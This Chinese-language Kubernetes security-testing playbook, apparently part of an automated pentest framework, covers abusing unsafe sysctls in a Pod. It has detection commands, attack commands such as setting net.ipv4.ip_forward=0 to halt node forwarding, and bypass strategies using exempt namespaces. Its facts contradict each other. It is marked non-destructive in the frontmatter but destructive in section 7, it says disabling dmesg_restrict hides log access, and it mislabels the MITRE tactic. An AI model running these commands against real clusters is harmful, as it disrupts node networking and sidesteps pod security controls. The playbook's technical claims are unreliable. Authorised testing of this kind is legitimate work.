---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-1.12]
mapped_compliance_families: [Pod安全, sysctl]
---

# sysctl-abuse — unsafe sysctl 内核参数篡改

Pod securityContext 暴露 unsafe sysctls（如 `kernel.dmesg_restrict`、`net.ipv4.ip_forward`），攻击者可修改节点内核参数，影响宿主机行为、隐蔽攻击痕迹或破坏网络转发。

---

## 1. 前置条件

- Pod securityContext.sysctls 配置了 unsafe sysctl（如 `kernel.dmesg_restrict=0`、`net.ipv4.ip_forward=1`）
- 节点 kubelet 的 `--allowed-unsafe-sysctls` 允许对应参数
- 攻击者对该 Pod 有 exec 权限或其镜像被劫持

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod 的 sysctl 配置
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.securityContext.sysctls}'
# 期望输出: [{"name":"kernel.dmesg_restrict","value":"0"}]

# [L1] 容器内观察：确认可修改内核参数
kubectl exec -n <ns> <pod-name> -- sysctl kernel.dmesg_restrict
# 期望输出: kernel.dmesg_restrict = 0
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 sysctl 配置详情
kubectl get pod <pod-name> -n <ns> -o yaml | grep -A10 sysctls
# 期望输出: 含 unsafe sysctl 名称与值

# [L0] 宿主机观察：检查 kubelet 是否允许 unsafe sysctl
kubectl get pods -n kube-system -l component=kubelet -o jsonpath='{.items[*].spec.containers[*].command}'
# 期望输出: command 含 --allowed-unsafe-sysctls=kernel.*

# [L1] 容器内观察：列出当前可修改的 sysctl
kubectl exec -n <ns> <pod-name> -- sysctl -a 2>/dev/null | grep -E "dmesg_restrict|ip_forward"
# 期望输出: kernel.dmesg_restrict = 0 / net.ipv4.ip_forward = 1
```

## 3. 攻击验证

```bash
# [L1] 容器内攻击验证：关闭 dmesg_restrict 隐藏内核日志访问
kubectl exec -n <ns> <pod-name> -- sysctl -w kernel.dmesg_restrict=0
# 期望输出: kernel.dmesg_restrict = 0

# [L2] 容器内攻击验证：篡改 ip_forward 破坏节点网络转发
kubectl exec -n <ns> <pod-name> -- sysctl -w net.ipv4.ip_forward=0
# 期望输出: net.ipv4.ip_forward = 0（节点转发停止）

# [L1] 容器内攻击验证：读取内核日志（dmesg_restrict 关闭后）
kubectl exec -n <ns> <pod-name> -- dmesg | tail
# 期望输出: 节点内核日志内容
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：节点 ip_forward 正常
ssh <node> -- cat /proc/sys/net/ipv4/ip_forward
# 期望输出: 1（启用转发）

# [L0] 攻击后环境对比：节点 ip_forward 被篡改
ssh <node> -- cat /proc/sys/net/ipv4/ip_forward
# 期望输出: 0 → 证明容器内 sysctl 影响了宿主机
```

差分结论：攻击前节点 `ip_forward=1`，攻击后在 Pod 内修改 sysctl 后节点变为 `0`，证明 unsafe sysctl 修改直接影响宿主机内核参数。

## 5. 绕过策略

```bash
# [L0] 检查 PodSecurity 是否限制 sysctl
kubectl get namespace <ns> -o jsonpath='{.metadata.labels}'
# 若含 pod-security.kubernetes.io/enforce=restricted → unsafe sysctl 被禁止

# 绕过方式：
# - [L1] 若 allowedUnsafeSysctls 为空但 kubelet 未显式禁用，尝试运行时 sysctl -w
# - [L2] 若 PodSecurity 限制但命名空间豁免，使用豁免命名空间
# - [L1] 若部分 unsafe sysctl 禁用但 safe sysctl 可改（如 net.ipv4.ip_local_port_range）造成影响
```

## 6. 证伪条件

```bash
# [L0] Pod 无 unsafe sysctls 配置
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.securityContext.sysctls}'
# 输出: 空 → 证伪

# [L1] 容器内无法修改对应 sysctl
kubectl exec -n <ns> <pod-name> -- sysctl -w kernel.dmesg_restrict=0 2>&1
# 输出: permission denied 或 read-only → 证伪

# [L0] kubelet 未允许 unsafe sysctls
kubectl get pods -n kube-system -l component=kubelet -o yaml | grep allowed-unsafe-sysctls
# 无输出 → 证伪
```

## 7. 审批级别

- **L2** 容器内攻击验证（篡改节点网络转发参数）→ **Level 4**（影响宿主机网络，需人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：是（篡改节点内核参数可能影响网络）
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Defense Evasion / Impact
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者通过 Pod 暴露的 unsafe sysctls 修改节点内核参数（如 `dmesg_restrict`、`ip_forward`），影响宿主机行为、隐藏攻击痕迹或破坏网络转发。